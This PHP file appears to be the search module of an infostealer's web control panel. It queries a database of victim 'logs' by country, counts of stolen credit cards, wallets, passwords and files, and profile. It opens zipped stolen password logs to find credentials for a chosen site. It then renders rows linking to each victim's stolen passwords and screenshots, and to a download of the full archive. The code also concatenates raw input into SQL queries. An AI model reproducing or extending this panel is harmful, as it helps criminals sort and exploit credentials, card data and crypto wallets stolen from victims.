<?php

error_reporting(0);

function convertToReadableSize($size)
{
  $base = log($size) / log(1024);
  $suffix = array("", " KB", " MB", " GB", " TB");
  $f_base = floor($base);
  return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base];
}

// ---------------------------------------------------------------------------------------
// SearchEngine
//
// Engine init point
// ---------------------------------------------------------------------------------------
function SearchEngine($query, $config)
{
	$query = explode(" ", $query);
	
	$sql_query = "SELECT * FROM `logs` WHERE ";
	$func_count = 0;
	$search_by_site = 0;
	$site;
	
	foreach ($query as $params)
	{
		$func = substr($params, 0, strpos($params, ":"));
		$param = substr(strstr($params, ':'), 1, strlen($params));
		
		switch($func)
		{
			case 'COUNTRY':
				$sql_query = $sql_query ." ". SearchByCountry($param, $func_count);
				break;
				
			case 'CC':
				$sql_query = $sql_query ." ". SearchByCC($param, $func_count);
				break;
				
			case 'WALLET':
				$sql_query = $sql_query ." ". SearchByWallets($param, $func_count);
				break;
				
			case 'PASSWORDS':
				$sql_query = $sql_query ." ". SearchByPasswords($param, $func_count);
				break;
				
			case 'FILES':
				$sql_query = $sql_query ." ". SearchByFiles($param, $func_count);
				break;
				
			case 'PROFILE':
				$sql_query = $sql_query ." ". SearchByProfile($param, $func_count);
				break;
				
			case 'site':
				$search_by_site = 1;
				$site = $param;
				//SearchBySite($sql_query, $param, $func_count, $config);
				break;
		}
		
		$func_count++;
	}
	
	if($search_by_site == 0)
	{
		//echo $sql_query;
		$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);
		
		if($database)
		{
			$logs = $database->query($sql_query);
			
			while ($log = $logs->fetch_assoc())
			{
				?>
						
								<tr class="c-table__cell">
									<td class="c-table__cell"><? echo $log["id"]; ?></td>
									
									<td class="c-table__cell"><? echo $log["hwid"]; ?>
										<small class="u-block u-text-mute"><? echo $log["system"]; ?></small>
									</td>
									
									<td class="c-table__cell"><? echo $log["ip"]; ?>
										<small class="u-block u-text-mute"><? echo $log["country"]; ?></small>
									</td>

									<td class="c-table__cell"><? echo substr($log["date"], 0, 10); ?>
										<small class="u-block u-text-mute"><? echo substr($log["date"], 11); ?></small>
									</td>
									
									<td class="c-table__cell"><? 
									$profileID = $log["profile"];
									$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$profileID';")->fetch_array();
					
									echo $profile["Name"];?></td>

									<td class="c-table__cell"><? echo convertToReadableSize(filesize('server/'.$config["logs_folder"].'/'. $log["user"])); ?></td>
									
									<td class="c-table__cell">Passwords: <? echo $log["passwords"]; ?> | CC: <? echo $log["cc"]; ?> | Wallets: <? echo $log["coins"]; ?> | Files: <? echo $log["files"]; ?></td>

									<td class="c-table__cell u-text-right">
										
										<div class="c-dropdown dropdown">
                                        <button class="c-btn c-btn--secondary has-dropdown dropdown-toggle" id="dropdownMenuButton1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
                                        
                                        <div class="c-dropdown__menu dropdown-menu" aria-labelledby="dropdownMenuButton1" x-placement="bottom-start" style="position: absolute; transform: translate3d(0px, 39px, 0px); top: 0px; left: 0px; will-change: transform;">
                                            <a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $log["user"]; ?>">View online</a>
											<a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $log["user"]; ?>&file=passwords.log">View passwords</a>
											<a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $log["user"]; ?>&file=screenshot.bmp" target="_blank">View screenshot</a>
                                            <a class="c-dropdown__item dropdown-item" href="/server/<? echo $config["logs_folder"]; ?>/<? echo $log["user"]; ?>">Download</a>
                                            <a class="c-dropdown__item dropdown-item" href="/deleteLog?id=<? echo $log["id"]; ?>">Delete</a>
                                        </div>
                                    </div>
										
									</td>
								</tr>
						
						<?
			}
		}
		
		mysqli_close($database);
	}
	else
	{
		$logsArray;
		$logsFound = 0;
				
		$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);
			
		if($database)
		{
			if($func_count == 1)
			{
				$logs = $database->query("SELECT * FROM `logs` ORDER BY `id` DESC LIMIT 1000;");
			}
			else
			{
				$logs = $database->query($sql_query);
			}
				
			while ($log = $logs->fetch_assoc())
			{
				
				$zip = new ZipArchive;
				$reading = "";
					
				if ($zip->open('server/'.$config["logs_folder"].'/'. $log["user"] .'') === TRUE) 
				{
					$reading = $zip->getFromName("passwords.log");
					$zip->close();
							
					$reading = nl2br($reading);
						
					$pos = stripos($reading, $site);
						
					if ($pos !== false)
					{
					?>		
					<tr class="c-table__cell">
						<td class="c-table__cell"><? echo $log["id"]; ?></td>
										
						<td class="c-table__cell"><? echo $log["hwid"]; ?>
							<small class="u-block u-text-mute"><? echo $log["system"]; ?></small>
						</td>
										
						<td class="c-table__cell"><? echo $log["ip"]; ?>
							<small class="u-block u-text-mute"><? echo $log["country"]; ?></small>
						</td>

						<td class="c-table__cell"><? echo substr($log["date"], 0, 10); ?>
							<small class="u-block u-text-mute"><? echo substr($log["date"], 11); ?></small>
						</td>

						<td class="c-table__cell"><? 
							$profileID = $log["profile"];
							$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$profileID';")->fetch_array();
						
							echo $profile["Name"];?>
						</td>

						
						<td class="c-table__cell"><? echo convertToReadableSize(filesize('server/'.$config["logs_folder"].'/'. $log["user"])); ?></td>
						
						<td class="c-table__cell">Passwords: <? echo $log["passwords"]; ?> | CC: <? echo $log["cc"]; ?> | Wallets: <? echo $log["coins"]; ?> | Files: <? echo $log["files"]; ?></td>

						<td class="c-table__cell u-text-right">
											
							<div class="c-dropdown dropdown">
								<button class="c-btn c-btn--secondary has-dropdown dropdown-toggle" id="dropdownMenuButton1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
											
								<div class="c-dropdown__menu dropdown-menu" aria-labelledby="dropdownMenuButton1" x-placement="bottom-start" style="position: absolute; transform: translate3d(0px, 39px, 0px); top: 0px; left: 0px; will-change: transform;">
									<a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $log["user"]; ?>">View online</a>
									<a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $log["user"]; ?>&file=passwords.log">View passwords</a>
									<a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $log["user"]; ?>&file=screenshot.bmp" target="_blank">View screenshot</a>
									<a class="c-dropdown__item dropdown-item" href="/server/<? echo $config["logs_folder"]; ?>/<? echo $log["user"]; ?>">Download</a>
									<a class="c-dropdown__item dropdown-item" href="/deleteLog?id=<? echo $log["id"]; ?>">Delete</a>
								</div>
							</div>	
						</td>
					</tr>	
					<?
					}
				} 
				else 
				{
					echo 'Error Reading File.';
				}
					
			}
		}
			
		mysqli_close($database);
	}
}

// ---------------------------------------------------------------------------------------
// SearchByCountry
//
// Generate SQL query by country
// ---------------------------------------------------------------------------------------
function SearchByCountry($param, $func_count)
{
	$param = explode(",", $param);
	
	if($func_count == 0)
	{
		$response = "`country` IN (";
	}
	else
	{
		$response = "AND `country` IN (";
	}
	
	$local_count = 0;
	
	foreach ($param as $p)
	{
		if($local_count == 0)
		{
			$response = $response. "'". $p ."'";
		}
		else
		{
			$response = $response. ", '". $p ."'";
		}
		
		$local_count++;
	}
	
	$response = $response .")";
	
	return $response;
}

// ---------------------------------------------------------------------------------------
// SearchByCC
//
// Generate SQL query by CC
// ---------------------------------------------------------------------------------------
function SearchByCC($param, $func_count)
{
	$response;
	
	if($func_count == 0)
	{
		$response = "`cc` ";
	}
	else
	{
		$response = "AND `cc` ";
	}
	
	if($param[0] == ">")
	{
		$param = substr($param, 1);
		$param++;
		$response = $response ."BETWEEN ". $param ." and '1000'";
	}
	else
	{
		$response = $response . "IN ('". $param ."')";
	}
	
	return $response;
}

// ---------------------------------------------------------------------------------------
// SearchByWallets
//
// Generate SQL query by wallets
// ---------------------------------------------------------------------------------------
function SearchByWallets($param, $func_count)
{
	$response;
	
	if($func_count == 0)
	{
		$response = "`coins` ";
	}
	else
	{
		$response = "AND `coins` ";
	}
	
	if($param[0] == ">")
	{
		$param = substr($param, 1);
		$param++;
		$response = $response ."BETWEEN ". $param ." and '1000'";
	}
	else
	{
		$response = $response . "IN ('". $param ."')";
	}
	
	return $response;
}

// ---------------------------------------------------------------------------------------
// SearchByPasswords
//
// Generate SQL query by passwords
// ---------------------------------------------------------------------------------------
function SearchByPasswords($param, $func_count)
{
	$response;
	
	if($func_count == 0)
	{
		$response = "`passwords` ";
	}
	else
	{
		$response = "AND `passwords` ";
	}
	
	if($param[0] == ">")
	{
		$param = substr($param, 1);
		$param++;
		$response = $response ."BETWEEN ". $param ." and '1000'";
	}
	else
	{
		$response = $response . "IN ('". $param ."')";
	}
	
	return $response;
}

// ---------------------------------------------------------------------------------------
// SearchByFiles
//
// Generate SQL query by files
// ---------------------------------------------------------------------------------------
function SearchByFiles($param, $func_count)
{
	$response;
	
	if($func_count == 0)
	{
		$response = "`files` ";
	}
	else
	{
		$response = "AND `files` ";
	}
	
	if($param[0] == ">")
	{
		$param = substr($param, 1);
		$param++;
		$response = $response ."BETWEEN ". $param ." and '1000'";
	}
	else
	{
		$response = $response . "IN ('". $param ."')";
	}
	
	return $response;	
}

// ---------------------------------------------------------------------------------------
// SearchByProfile
//
// Generate SQL query by profile
// ---------------------------------------------------------------------------------------
function SearchByProfile($param, $func_count)
{
	$response;
	
	if($func_count == 0)
	{
		$response = "`profile` ";
	}
	else
	{
		$response = "AND `profile` ";
	}
	
	$response = $response . "IN ('". $param ."')";
	
	return $response;
}

?>